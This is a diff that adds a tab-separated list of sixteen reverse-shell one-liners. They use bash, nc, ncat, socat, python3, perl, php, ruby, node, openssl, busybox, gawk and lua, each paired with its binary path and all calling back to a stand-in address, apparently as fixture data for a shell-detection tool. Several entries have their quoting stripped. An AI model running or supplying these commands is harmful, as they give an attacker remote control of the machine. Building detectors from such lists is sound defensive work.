@@ -1,0 +1,16 @@
+bash -i >& /dev/tcp/203.0.113.20/443 0>&1	/usr/bin/bash
+sh -c exec 3<>/dev/tcp/203.0.113.20/8080;sh <&3 >&3 2>&3	/usr/bin/sh
+nc 203.0.113.20 9999 -e /bin/sh	/usr/bin/nc
+ncat --exec /bin/bash 203.0.113.20 9999	/usr/bin/ncat
+ncat -e /bin/sh 203.0.113.20 9999	/usr/bin/ncat
+mkfifo /tmp/p;nc 203.0.113.20 9999 </tmp/p|/bin/sh >/tmp/p 2>&1	/usr/bin/bash
+socat TCP:203.0.113.20:9999 EXEC:/bin/sh,pty,stderr	/usr/bin/socat
+python3 -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('203.0.113.20',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')	/usr/bin/python3
+perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'203.0.113.20:9999');STDIN->fdopen($c,r);system$_ while<>;	/usr/bin/perl
+php -r $s=fsockopen('203.0.113.20',9999);passthru('/bin/sh -i <&3 >&3 2>&3');	/usr/bin/php
+ruby -rsocket -e s=TCPSocket.open('203.0.113.20',9999);exec('/bin/sh -i <&%d >&%d 2>&%d',s.fileno)	/usr/bin/ruby
+node -e sh=require('child_process').spawn('/bin/sh');require('net').connect(9999,'203.0.113.20',function(){this.pipe(sh.stdin);sh.stdout.pipe(this)})	/usr/bin/node
+openssl s_client -quiet -connect 203.0.113.20:9999 | /bin/sh | openssl s_client -quiet -connect 203.0.113.20:9998	/usr/bin/openssl
+busybox nc 203.0.113.20 9999 -e sh	/bin/busybox
+awk BEGIN{c="/inet/tcp/0/203.0.113.20/9999";while(1){c|&getline x;x|&getline y;print y|&c}}	/usr/bin/gawk
+lua -e local s=require('socket').tcp();s:connect('203.0.113.20',9999);os.execute('/bin/sh -i <&3')	/usr/bin/lua
